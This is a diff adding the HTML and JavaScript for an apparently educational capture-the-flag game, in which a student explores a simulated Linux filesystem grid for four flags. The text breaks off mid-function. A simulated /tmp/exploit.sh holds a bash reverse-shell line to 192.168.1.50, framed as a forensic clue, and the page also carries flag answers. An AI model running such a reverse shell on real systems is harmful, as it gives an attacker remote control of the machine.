@@ -1,0 +1,1404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LINUX-FS-01: Root Access | Operator</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background: #0a0c10;
+            color: rgba(255,255,255,0.85);
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* CRT scanlines */
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0,0,0,0.1) 0px,
+                rgba(0,0,0,0.1) 1px,
+                transparent 1px,
+                transparent 3px
+            );
+            pointer-events: none;
+            z-index: 9000;
+        }
+
+        /* ─── Header ─── */
+        .mission-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background: #0e1018;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.15);
+            height: 44px;
+            flex-shrink: 0;
+        }
+        .mission-header-back {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.4);
+            text-decoration: none;
+            letter-spacing: 0.08em;
+            transition: color 0.2s;
+        }
+        .mission-header-back:hover { color: #39ff14; }
+        .mission-header-title {
+            font-size: 0.7rem;
+            letter-spacing: 0.15em;
+            color: #39ff14;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        .mission-header-status {
+            font-size: 0.6rem;
+            letter-spacing: 0.12em;
+            color: rgba(57, 255, 20, 0.4);
+            text-transform: uppercase;
+        }
+
+        /* ─── Objectives Bar ─── */
+        .obj-bar {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 7px 20px;
+            background: #0c0e14;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            overflow-x: auto;
+            flex-shrink: 0;
+        }
+        .obj-label {
+            font-size: 0.55rem;
+            letter-spacing: 0.15em;
+            color: rgba(57, 255, 20, 0.3);
+            text-transform: uppercase;
+            white-space: nowrap;
+            margin-right: 4px;
+        }
+        .obj-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.25);
+            letter-spacing: 0.04em;
+            white-space: nowrap;
+            transition: color 0.3s;
+        }
+        .obj-item.complete { color: #39ff14; }
+        .obj-check {
+            width: 13px;
+            height: 13px;
+            border-radius: 3px;
+            border: 1px solid rgba(57, 255, 20, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.55rem;
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        .obj-item.complete .obj-check {
+            background: rgba(57, 255, 20, 0.15);
+            border-color: #39ff14;
+            color: #39ff14;
+        }
+
+        /* ─── Split Layout ─── */
+        .mission-layout {
+            display: flex;
+            height: calc(100vh - 44px - 30px);
+        }
+
+        /* ─── Map Panel (left 55%) ─── */
+        .map-panel {
+            flex: 0 0 55%;
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid rgba(57, 255, 20, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #090b0f;
+        }
+        .map-panel::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(57, 255, 20, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(57, 255, 20, 0.015) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+        }
+
+        /* ─── Grid ─── */
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            grid-template-rows: repeat(4, 1fr);
+            gap: 4px;
+            padding: 20px;
+            width: 100%;
+            height: 100%;
+            max-width: 600px;
+            max-height: 480px;
+        }
+
+        .grid-cell {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(57, 255, 20, 0.06);
+            border-radius: 4px;
+            position: relative;
+            transition: all 0.4s ease;
+            min-height: 0;
+            overflow: hidden;
+        }
+
+        /* Cell visibility states */
+        .grid-cell.vis-hidden {
+            background: rgba(57, 255, 20, 0.01);
+            border-color: rgba(57, 255, 20, 0.04);
+        }
+        .grid-cell.vis-revealed {
+            background: rgba(57, 255, 20, 0.05);
+            border-color: rgba(57, 255, 20, 0.15);
+        }
+        .grid-cell.vis-visited {
+            background: rgba(57, 255, 20, 0.09);
+            border-color: rgba(57, 255, 20, 0.25);
+        }
+        .grid-cell.current {
+            background: rgba(57, 255, 20, 0.14);
+            border-color: #39ff14;
+            box-shadow: 0 0 12px rgba(57, 255, 20, 0.15), inset 0 0 8px rgba(57, 255, 20, 0.05);
+        }
+        .grid-cell.wall {
+            background: rgba(255, 255, 255, 0.015);
+            border-color: rgba(255, 255, 255, 0.03);
+        }
+        .grid-cell.empty-vis {
+            background: rgba(57, 255, 20, 0.03);
+        }
+
+        /* Flag directory accent */
+        .grid-cell[data-has-flag="true"]:not(.vis-hidden):not(.wall) {
+            border-left: 2px solid rgba(255, 215, 0, 0.4);
+        }
+        .grid-cell[data-flag-found="true"]:not(.vis-hidden) {
+            border-left-color: rgba(57, 255, 20, 0.4);
+        }
+
+        /* Cell content */
+        .cell-icon {
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            transition: color 0.3s;
+        }
+        .cell-label {
+            font-size: 0.5rem;
+            letter-spacing: 0.06em;
+            margin-top: 2px;
+            transition: color 0.3s;
+            text-align: center;
+        }
+        .vis-hidden .cell-icon { color: rgba(255, 255, 255, 0.06); }
+        .vis-hidden .cell-label { color: transparent; }
+        .vis-revealed .cell-icon { color: rgba(57, 255, 20, 0.45); }
+        .vis-revealed .cell-label { color: rgba(57, 255, 20, 0.2); }
+        .vis-visited .cell-icon { color: rgba(57, 255, 20, 0.7); }
+        .vis-visited .cell-label { color: rgba(57, 255, 20, 0.35); }
+        .current .cell-icon { color: #39ff14; }
+        .current .cell-label { color: rgba(57, 255, 20, 0.6); }
+        .wall .cell-icon { color: rgba(255, 255, 255, 0.04); }
+        .wall .cell-label { color: transparent; }
+
+        /* Agent dot */
+        .cell-agent {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #39ff14;
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            animation: agentPulse 2s ease-in-out infinite;
+            box-shadow: 0 0 6px rgba(57, 255, 20, 0.5);
+        }
+        @keyframes agentPulse {
+            0%, 100% { box-shadow: 0 0 4px rgba(57, 255, 20, 0.3); transform: scale(1); }
+            50% { box-shadow: 0 0 12px rgba(57, 255, 20, 0.7), 0 0 20px rgba(57, 255, 20, 0.15); transform: scale(1.15); }
+        }
+
+        /* Cell reveal animation */
+        @keyframes cellReveal {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .grid-cell.just-revealed {
+            animation: cellReveal 0.4s ease-out;
+        }
+
+        /* ─── Terminal Panel (right 45%) ─── */
+        .term-panel {
+            flex: 0 0 45%;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            background: #080a0e;
+        }
+        .term-bar {
+            padding: 7px 14px;
+            background: #0c0e14;
+            border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+        .term-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: rgba(57, 255, 20, 0.3);
+        }
+        .term-bar-label {
+            font-size: 0.55rem;
+            color: rgba(57, 255, 20, 0.35);
+            letter-spacing: 0.1em;
+            margin-left: 6px;
+        }
+        .term-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px 14px;
+            font-size: 0.78rem;
+            line-height: 1.65;
+        }
+        .term-output::-webkit-scrollbar { width: 4px; }
+        .term-output::-webkit-scrollbar-track { background: transparent; }
+        .term-output::-webkit-scrollbar-thumb { background: rgba(57, 255, 20, 0.15); border-radius: 2px; }
+
+        /* Terminal line types */
+        .term-line { word-break: break-word; }
+        .term-system { color: rgba(57, 255, 20, 0.3); }
+        .term-info { color: rgba(57, 255, 20, 0.65); }
+        .term-success { color: #39ff14; font-weight: 600; }
+        .term-error { color: #ff4444; }
+        .term-warning { color: #ffaa00; }
+        .term-node-info { color: #00ccff; }
+        .term-heading { color: #39ff14; font-weight: 700; }
+        .term-prompt-echo { color: rgba(57, 255, 20, 0.45); }
+        .term-flag { color: #ffd700; font-weight: 700; }
+
+        /* Terminal input */
+        .term-input-row {
+            display: flex;
+            align-items: center;
+            padding: 8px 14px;
+            border-top: 1px solid rgba(57, 255, 20, 0.1);
+            background: #0a0c12;
+            flex-shrink: 0;
+        }
+        .term-prompt-text {
+            color: #39ff14;
+            font-size: 0.78rem;
+            white-space: nowrap;
+            margin-right: 8px;
+        }
+        .term-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #76ff03;
+            font-family: 'Courier New', monospace;
+            font-size: 0.78rem;
+            caret-color: #39ff14;
+        }
+
+        /* ─── Mission Complete Overlay ─── */
+        .mission-complete {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.88);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 8000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.6s;
+        }
+        .mission-complete.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .mc-card {
+            background: #0e1018;
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 8px;
+            padding: 36px 40px;
+            text-align: center;
+            max-width: 380px;
+            width: 90%;
+        }
+        .mc-badge {
+            font-size: 0.55rem;
+            letter-spacing: 0.2em;
+            color: rgba(57, 255, 20, 0.5);
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+        .mc-title {
+            font-size: 1.3rem;
+            color: #39ff14;
+            letter-spacing: 0.2em;
+            margin-bottom: 6px;
+            text-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
+        }
+        .mc-subtitle {
+            font-size: 0.7rem;
+            color: rgba(255,255,255,0.35);
+            margin-bottom: 28px;
+        }
+        .mc-stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        .mc-stat-value {
+            font-size: 1.5rem;
+            color: #39ff14;
+            font-weight: 700;
+        }
+        .mc-stat-label {
+            font-size: 0.55rem;
+            color: rgba(255,255,255,0.25);
+            letter-spacing: 0.08em;
+            margin-top: 3px;
+            text-transform: uppercase;
+        }
+        .mc-btn {
+            display: inline-block;
+            padding: 10px 28px;
+            background: rgba(57, 255, 20, 0.1);
+            border: 1px solid rgba(57, 255, 20, 0.3);
+            border-radius: 4px;
+            color: #39ff14;
+            font-family: 'Courier New', monospace;
+            font-size: 0.7rem;
+            letter-spacing: 0.12em;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .mc-btn:hover {
+            background: rgba(57, 255, 20, 0.2);
+            border-color: #39ff14;
+            box-shadow: 0 0 15px rgba(57, 255, 20, 0.15);
+        }
+
+        /* ─── Mobile ─── */
+        @media (max-width: 768px) {
+            .mission-layout {
+                flex-direction: column;
+            }
+            .map-panel {
+                flex: 0 0 42%;
+                border-right: none;
+                border-bottom: 1px solid rgba(57, 255, 20, 0.1);
+            }
+            .term-panel {
+                flex: 1;
+            }
+            .obj-bar { gap: 10px; padding: 6px 12px; }
+            .obj-item { font-size: 0.5rem; }
+            .obj-label { font-size: 0.5rem; }
+            .grid-container { padding: 10px; max-height: none; }
+        }
+        @media (max-width: 480px) {
+            .mission-header { padding: 8px 12px; height: 38px; }
+            .mission-header-title { font-size: 0.6rem; }
+            .mission-layout { height: calc(100vh - 38px - 26px); }
+            .cell-label { display: none; }
+            .cell-icon { font-size: 0.7rem; }
+            .cell-agent { width: 8px; height: 8px; bottom: 3px; right: 3px; }
+            .mc-card { padding: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <div class="mission-header">
+        <a href="../index.html" class="mission-header-back">&larr; OPERATOR</a>
+        <div class="mission-header-title">LINUX-FS-01 / ROOT ACCESS</div>
+        <div class="mission-header-status" id="header-status">IN PROGRESS</div>
+    </div>
+
+    <!-- Objectives bar -->
+    <div class="obj-bar">
+        <span class="obj-label">OBJ</span>
+        <div class="obj-item" id="obj-0">
+            <span class="obj-check"></span> Find FLAG-1
+        </div>
+        <div class="obj-item" id="obj-1">
+            <span class="obj-check"></span> Find FLAG-2
+        </div>
+        <div class="obj-item" id="obj-2">
+            <span class="obj-check"></span> Find FLAG-3
+        </div>
+        <div class="obj-item" id="obj-3">
+            <span class="obj-check"></span> Find FLAG-4
+        </div>
+    </div>
+
+    <!-- Split layout -->
+    <div class="mission-layout">
+        <!-- Left: Filesystem Map -->
+        <div class="map-panel">
+            <div class="grid-container" id="grid-container"></div>
+        </div>
+
+        <!-- Right: Terminal -->
+        <div class="term-panel" id="term-panel">
+            <div class="term-bar">
+                <div class="term-dot"></div>
+                <div class="term-dot"></div>
+                <div class="term-dot"></div>
+                <span class="term-bar-label">OPERATOR TERMINAL</span>
+            </div>
+            <div class="term-output" id="term-output"></div>
+            <div class="term-input-row">
+                <span class="term-prompt-text">root@hexworth:~#</span>
+                <input type="text" class="term-input" id="term-input" autocomplete="off" spellcheck="false" autofocus>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mission Complete Overlay -->
+    <div class="mission-complete" id="mission-complete">
+        <div class="mc-card">
+            <div class="mc-badge">MISSION COMPLETE</div>
+            <div class="mc-title">ROOT ACCESS</div>
+            <div class="mc-subtitle">Filesystem explored. All flags captured.</div>
+            <div class="mc-stats">
+                <div>
+                    <div class="mc-stat-value" id="stat-flags">0</div>
+                    <div class="mc-stat-label">Flags</div>
+                </div>
+                <div>
+                    <div class="mc-stat-value" id="stat-commands">0</div>
+                    <div class="mc-stat-label">Commands</div>
+                </div>
+                <div>
+                    <div class="mc-stat-value" id="stat-time">0s</div>
+                    <div class="mc-stat-label">Time</div>
+                </div>
+            </div>
+            <a href="../index.html" class="mc-btn">RETURN TO OPERATOR</a>
+        </div>
+    </div>
+
+<script>
+/* ===================================================================
+   LINUX-FS-01: Root Access — Mission Engine
+   =================================================================== */
+
+// --- Grid Map ---
+// Rows 0-3, Cols 0-4
+var GRID_MAP = [
+    ['root-home',  'etc-dir',   'var-log',  'usr-bin',   'wall'],
+    ['empty',      'opt-dir',   'empty',    'tmp-dir',   'srv-dir'],
+    ['wall',       'home-user', 'empty',    'empty',     'wall'],
+    ['wall',       'wall',      'dev-dir',  'wall',      'wall']
+];
+
+var ROWS = 4;
+var COLS = 5;
+
+// --- Cell Info ---
+var CELL_INFO = {
+    'root-home': { label: '/root',      abbr: 'ROOT', ip: '(superuser)', desc: 'Root home directory \u2014 restricted access',  ports: ['.bashrc','.ssh/','flag1.txt'],                      os: 'drwx------',   hasFlag: true,  flagFile: 'flag1.txt', flagValue: 'FLAG{r00t_4ccess_gr4nted}' },
+    'etc-dir':   { label: '/etc',       abbr: 'ETC',  ip: '(configs)',   desc: 'System configuration files',                    ports: ['passwd','shadow','hosts','crontab'],                 os: 'drwxr-xr-x',  hasFlag: false },
+    'var-log':   { label: '/var/log',   abbr: 'LOG',  ip: '(logs)',      desc: 'System and application log files',              ports: ['syslog','auth.log','kern.log','flag2.txt'],          os: 'drwxr-xr-x',  hasFlag: true,  flagFile: 'flag2.txt', flagValue: 'FLAG{l0g_4nalysis_m4ster}' },
+    'usr-bin':   { label: '/usr/bin',   abbr: 'BIN',  ip: '(binaries)',  desc: 'User command binaries',                         ports: ['python3','vim','git','curl','nmap'],                  os: 'drwxr-xr-x',  hasFlag: false },
+    'opt-dir':   { label: '/opt',       abbr: 'OPT',  ip: '(optional)', desc: 'Optional third-party software',                 ports: ['webapp/','tools/','flag3.txt'],                      os: 'drwxr-xr-x',  hasFlag: true,  flagFile: 'flag3.txt', flagValue: 'FLAG{0pt_d1rectory_h1dden}' },
+    'tmp-dir':   { label: '/tmp',       abbr: 'TMP',  ip: '(temp)',      desc: 'Temporary files \u2014 world-writable',         ports: ['.hidden/','session.tmp','exploit.sh'],               os: 'drwxrwxrwt',  hasFlag: false },
+    'srv-dir':   { label: '/srv',       abbr: 'SRV',  ip: '(services)', desc: 'Service data directory',                         ports: ['www/','ftp/','flag4.txt'],                           os: 'drwxr-xr-x',  hasFlag: true,  flagFile: 'flag4.txt', flagValue: 'FLAG{s3rv1ce_d4ta_f0und}' },
+    'home-user': { label: '/home/user', abbr: 'USR',  ip: '(student)',   desc: 'Student home directory',                        ports: ['Desktop/','Documents/','notes.txt'],                 os: 'drwxr-xr-x',  hasFlag: false },
+    'dev-dir':   { label: '/dev',       abbr: 'DEV',  ip: '(devices)',   desc: 'Device special files',                          ports: ['null','zero','random','sda1'],                       os: 'drwxr-xr-x',  hasFlag: false }
+};
+
+// --- File Contents (for cat command) ---
+var FILE_CONTENTS = {
+    'root-home': {
+        '.bashrc':    'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nexport PS1="root@hexworth:~# "\nalias ll="ls -la"\nalias rm="rm -i"',
+        '.ssh/':      '[directory] authorized_keys  id_rsa  id_rsa.pub  known_hosts',
+        'flag1.txt':  'FLAG{r00t_4ccess_gr4nted}'
+    },
+    'etc-dir': {
+        'passwd':     'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nstudent:x:1000:1000:student:/home/user:/bin/bash',
+        'shadow':     '[Permission denied] Cannot read /etc/shadow without elevated privileges.\nHint: You already have root access.',
+        'hosts':      '127.0.0.1       localhost\n127.0.1.1       hexworth\n10.0.0.1        gateway.hexworth.local\n10.0.0.99       target.hexworth.local',
+        'crontab':    '# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 * * * *  root  cd / && run-parts --report /etc/cron.hourly\n25 6 * * *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n0  3 * * 0  root  /opt/tools/backup.sh >> /var/log/backup.log 2>&1'
+    },
+    'var-log': {
+        'syslog':     'Mar  5 08:12:01 hexworth systemd[1]: Started Session 42 of user root.\nMar  5 08:12:03 hexworth kernel: [42069.123] eth0: link up\nMar  5 08:15:22 hexworth CRON[1337]: (root) CMD (/opt/tools/backup.sh)\nMar  5 08:20:01 hexworth systemd[1]: Starting Cleanup of Temporary Directories...',
+        'auth.log':   'Mar  5 03:14:07 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:09 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:12 hexworth sshd[9001]: Failed password for root from 192.168.1.50 port 44231\nMar  5 03:14:15 hexworth sshd[9001]: Connection closed by 192.168.1.50 port 44231 [preauth]\nMar  5 06:00:01 hexworth sshd[9200]: Accepted publickey for root from 10.0.0.1 port 22',
+        'kern.log':   'Mar  5 00:00:02 hexworth kernel: [    0.000000] Linux version 6.1.0-hexworth (gcc 12.2.0)\nMar  5 00:00:02 hexworth kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz-6.1.0\nMar  5 00:00:02 hexworth kernel: [    0.523104] EXT4-fs (sda1): mounted filesystem with ordered data mode',
+        'flag2.txt':  'FLAG{l0g_4nalysis_m4ster}'
+    },
+    'usr-bin': {
+        'python3':    '[binary] Python 3.12.1 interpreter  /usr/bin/python3',
+        'vim':        '[binary] Vi IMproved 9.0            /usr/bin/vim',
+        'git':        '[binary] git version 2.43.0         /usr/bin/git',
+        'curl':       '[binary] curl 8.5.0                 /usr/bin/curl',
+        'nmap':       '[binary] Nmap 7.94                  /usr/bin/nmap'
+    },
+    'opt-dir': {
+        'webapp/':    '[directory] index.html  app.js  config.json  .env',
+        'tools/':     '[directory] backup.sh  monitor.py  deploy.sh',
+        'flag3.txt':  'FLAG{0pt_d1rectory_h1dden}'
+    },
+    'tmp-dir': {
+        '.hidden/':   '[directory] .cache  .runtime  .sock',
+        'session.tmp': 'SESSION_ID=a3f8c2e1b9d04567\nUSER=www-data\nEXPIRES=1709683200\nTOKEN=eyJhbGciOiJIUzI1NiJ9.dGVzdA.abc123',
+        'exploit.sh': '#!/bin/bash\n# Suspicious script found in /tmp\nbash -i >& /dev/tcp/192.168.1.50/4444 0>&1\n# WARNING: This is a reverse shell!\n# Attacker IP: 192.168.1.50\n# Check auth.log for related login attempts'
+    },
+    'srv-dir': {
+        'www/':       '[directory] html/  cgi-bin/  logs/  .htaccess',
+        'ftp/':       '[directory] pub/  incoming/  users/',
+        'flag4.txt':  'FLAG{s3rv1ce_d4ta_f0und}'
+    },
+    'home-user': {
+        'Desktop/':   '[directory] (empty)',
+        'Documents/': '[directory] homework.txt  project/  README.md',
+        'notes.txt':  'TODO:\n- Check /var/log/auth.log for failed logins\n- Look for suspicious scripts in /tmp\n- Review crontab entries in /etc\n- Investigate /opt for hidden flags\n- Explore /srv service directories'
+    },
+    'dev-dir': {
+        'null':       '[character special] /dev/null \u2014 data sink, discards all input',
+        'zero':       '[character special] /dev/zero \u2014 produces continuous null bytes',
+        'random':     '[character special] /dev/random \u2014 cryptographic random number generator',
+        'sda1':       '[block special] /dev/sda1 \u2014 primary disk partition, 50GB, ext4'
+    }
+};
+
+// --- Game State ---
+var STATE = {
+    position: { col: 0, row: 0 },
+    visibility: {},
+    objectives: [false, false, false, false],
+    dirsVisited: new Set(),
+    flagsFound: new Set(),
+    commandCount: 0,
+    commandHistory: [],
+    historyIndex: -1,
+    startTime: Date.now(),
+    completed: false
+};
+
+// --- Objective labels ---
+var OBJ_LABELS = [
+    'FLAG-1 CAPTURED \u2014 /root/flag1.txt',
+    'FLAG-2 CAPTURED \u2014 /var/log/flag2.txt',
+    'FLAG-3 CAPTURED \u2014 /opt/flag3.txt',
+    'FLAG-4 CAPTURED \u2014 /srv/flag4.txt'
+];
+
+// === Grid Rendering ===
+
+function buildGrid() {
+    var container = document.getElementById('grid-container');
+    container.innerHTML = '';
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var cell = document.createElement('div');
+            cell.className = 'grid-cell';
+            cell.dataset.col = c;
+            cell.dataset.row = r;
+            cell.dataset.type = GRID_MAP[r][c];
+
+            var type = GRID_MAP[r][c];
+            var info = CELL_INFO[type];
+            cell.dataset.hasFlag = (info && info.hasFlag) ? 'true' : 'false';
+            cell.dataset.flagFound = 'false';
+
+            var icon = document.createElement('div');
+            icon.className = 'cell-icon';
+
+            var label = document.createElement('div');
+            label.className = 'cell-label';
+
+            var agent = document.createElement('div');
+            agent.className = 'cell-agent';
+            agent.style.display = 'none';
+
+            cell.appendChild(icon);
+            cell.appendChild(label);
+            cell.appendChild(agent);
+            container.appendChild(cell);
+        }
+    }
+}
+
+function updateGrid() {
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var cell = document.querySelector('.grid-cell[data-col="' + c + '"][data-row="' + r + '"]');
+            if (!cell) continue;
+
+            var type = GRID_MAP[r][c];
+            var key = c + ',' + r;
+            var vis = STATE.visibility[key] || 'hidden';
+            var isCurrent = STATE.position.col === c && STATE.position.row === r;
+
+            // Reset classes
+            cell.className = 'grid-cell';
+            cell.dataset.col = c;
+            cell.dataset.row = r;
+            cell.dataset.type = type;
+
+            var info = CELL_INFO[type];
+            cell.dataset.hasFlag = (info && info.hasFlag) ? 'true' : 'false';
+            cell.dataset.flagFound = (info && info.hasFlag && STATE.flagsFound.has(type)) ? 'true' : 'false';
+
+            if (type === 'wall') {
+                cell.classList.add('wall');
+            } else if (isCurrent) {
+                cell.classList.add('current');
+            } else {
+                cell.classList.add('vis-' + vis);
+                if (type === 'empty' && vis !== 'hidden') cell.classList.add('empty-vis');
+            }
+
+            // Content
+            var iconEl = cell.querySelector('.cell-icon');
+            var labelEl = cell.querySelector('.cell-label');
+            var agentEl = cell.querySelector('.cell-agent');
+
+            if (type === 'wall') {
+                iconEl.textContent = '';
+                labelEl.textContent = '';
+            } else if (vis === 'hidden' && !isCurrent) {
+                iconEl.textContent = '?';
+                labelEl.textContent = '';
+            } else if (type === 'empty') {
+                iconEl.textContent = '\u00B7';
+                labelEl.textContent = '';
+            } else {
+                iconEl.textContent = info.abbr;
+                labelEl.textContent = (vis === 'visited' || isCurrent) ? info.label : '';
+            }
+
+            agentEl.style.display = isCurrent ? 'block' : 'none';
+        }
+    }
+}
+
+// === Fog of War ===
+
+function revealAdjacent(col, row) {
+    var dirs = [[0,-1],[0,1],[1,0],[-1,0]];
+    dirs.forEach(function(d) {
+        var nc = col + d[0];
+        var nr = row + d[1];
+        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) return;
+        if (GRID_MAP[nr][nc] === 'wall') return;
+        var key = nc + ',' + nr;
+        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
+            STATE.visibility[key] = 'revealed';
+            var cell = document.querySelector('.grid-cell[data-col="' + nc + '"][data-row="' + nr + '"]');
+            if (cell) {
+                cell.classList.add('just-revealed');
+                setTimeout(function() { cell.classList.remove('just-revealed'); }, 500);
+            }
+        }
+    });
+}
+
+// === Terminal Output ===
+
+function printLine(text, type) {
+    var output = document.getElementById('term-output');
+    var line = document.createElement('div');
+    line.className = 'term-line term-' + (type || 'system');
+    line.textContent = text;
+    output.appendChild(line);
+
+    // Cap at 200 lines
+    while (output.children.length > 200) {
+        output.removeChild(output.firstChild);
+    }
+    output.scrollTop = output.scrollHeight;
+}
+
+// === Node Resolution ===
+
+function resolveNode(query) {
+    var q = query.toLowerCase();
+    var exact = [];
+    var partial = [];
+
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var type = GRID_MAP[r][c];
+            if (type === 'empty' || type === 'wall') continue;
+            var info = CELL_INFO[type];
+            var vis = STATE.visibility[c + ',' + r] || 'hidden';
+            var entry = { type: type, col: c, row: r, visibility: vis, info: info };
+
+            if (q === type || q === info.label.toLowerCase() || q === info.abbr.toLowerCase()) {
+                exact.push(entry);
+            } else if (type.indexOf(q) !== -1 || info.label.toLowerCase().indexOf(q) !== -1) {
+                partial.push(entry);
+            }
+        }
+    }
+
+    var results = exact.length > 0 ? exact : partial;
+
+    if (results.length === 1) return results[0];
+    if (results.length > 1) {
+        printLine('Multiple matches. Be more specific:', 'warning');
+        results.forEach(function(m) {
+            printLine('  ' + m.info.label + ' ' + m.info.ip, 'info');
+        });
+        return null;
+    }
+    return null;
+}
+
+// === Current cell helper ===
+
+function getCurrentCellType() {
+    return GRID_MAP[STATE.position.row][STATE.position.col];
+}
+
+function getCurrentCellInfo() {
+    var type = getCurrentCellType();
+    return (type !== 'empty' && type !== 'wall') ? CELL_INFO[type] : null;
+}
+
+// === Command Handlers ===
+
+function cmdHelp() {
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
+    printLine('  scan            Survey area, reveal adjacent directories', 'info');
+    printLine('  move <dir>      Move (north/south/east/west or n/s/e/w)', 'info');
+    printLine('  ls              List contents of current directory', 'info');
+    printLine('  cat <file>      Read a file in the current directory', 'info');
+    printLine('  grep <pattern>  Search for pattern in current directory', 'info');
+    printLine('  find <pattern>  Search visited directories for files', 'info');
+    printLine('  pwd             Show current directory path', 'info');
+    printLine('  ping <node>     Check a directory by name', 'info');
+    printLine('  status          Show position and objectives', 'info');
+    printLine('  help            Show this reference', 'info');
+    printLine('  clear           Clear terminal output', 'info');
+    printLine('', 'system');
+    printLine('Directories: reference by name or abbreviation.', 'system');
+    printLine('Examples: move north, cat passwd, grep FLAG, find flag', 'system');
+}
+
+function cmdScan() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = getCurrentCellType();
+
+    printLine('Scanning area...', 'system');
+    printLine('', 'system');
+
+    if (cellType !== 'empty' && cellType !== 'wall') {
+        var cur = CELL_INFO[cellType];
+        printLine('Current: ' + cur.label + ' ' + cur.ip, 'heading');
+        printLine(cur.desc, 'info');
+        printLine('Permissions: ' + cur.os, 'node-info');
+    } else {
+        printLine('Current: Empty path (no directory)', 'heading');
+    }
+
+    printLine('', 'system');
+    printLine('Adjacent:', 'heading');
+
+    var dirs = [
+        { name: 'North', dc: 0, dr: -1 },
+        { name: 'South', dc: 0, dr: 1 },
+        { name: 'East',  dc: 1, dr: 0 },
+        { name: 'West',  dc: -1, dr: 0 }
+    ];
+
+    dirs.forEach(function(d) {
+        var nc = col + d.dc;
+        var nr = row + d.dr;
+        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) {
+            printLine('  ' + d.name + ': [filesystem boundary]', 'system');
+            return;
+        }
+        var type = GRID_MAP[nr][nc];
+        if (type === 'wall') {
+            printLine('  ' + d.name + ': [inaccessible]', 'system');
+            return;
+        }
+        var key = nc + ',' + nr;
+        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
+            STATE.visibility[key] = 'revealed';
+        }
+        if (type === 'empty') {
+            printLine('  ' + d.name + ': Empty path', 'info');
+        } else {
+            var info = CELL_INFO[type];
+            printLine('  ' + d.name + ': ' + info.label + ' ' + info.ip, 'node-info');
+        }
+    });
+
+    updateGrid();
+    saveState();
+}
+
+function cmdMove(args) {
+    if (!args.length) {
+        printLine('Usage: move <direction>', 'error');
+        printLine('Directions: north/south/east/west (or n/s/e/w)', 'system');
+        return;
+    }
+
+    var dirMap = {
